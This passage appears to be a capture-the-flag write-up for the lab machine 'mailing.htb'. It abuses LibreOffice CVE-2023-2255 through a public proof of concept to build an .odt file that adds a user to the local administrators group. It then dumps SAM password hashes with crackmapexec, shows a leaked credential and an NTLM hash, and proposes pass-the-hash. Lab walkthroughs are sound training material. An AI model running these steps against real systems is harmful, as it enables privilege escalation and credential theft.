...
* We discover a cve related to this version of Libre Office.
    ...
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> https://www.libreoffice.org/about-us/security/advisories/CVE-2023-2255
	
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> https://github.com/elweth-sec/CVE-2023-2255
...
* Use the PoC to make a bad `.odt` file that injects the `cmd` to add maya to local `Administradores` group.
    ...
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `python3 CVE-2023-2255.py  --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'`
...
* Since we have administrator rights to `maya` lets bust out one of our trusty windows tools `crackmapexec`.
    ...
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> We are going to connect to the SMB we discovered in our Recon during initial engagement.
        ...
        <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn`
		
        <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `445/tcp   open  microsoft-ds? syn-ack ttl 127`

* crackmapexec smb mailing.htb -u maya -p "m4y4ngs4ri" --sam
	
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> Using this command with the `--sam` flag allows us to request the from the `SAM Database` and get hash passwords.
...
* We successfully dump the `localadmin` hash. Now we can perform a `pass the hash` attack and remote into the box with this hash.
    ...
    <i class="fa-solid fa-frog" style="color: #b8bb26;"></i> `localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::`
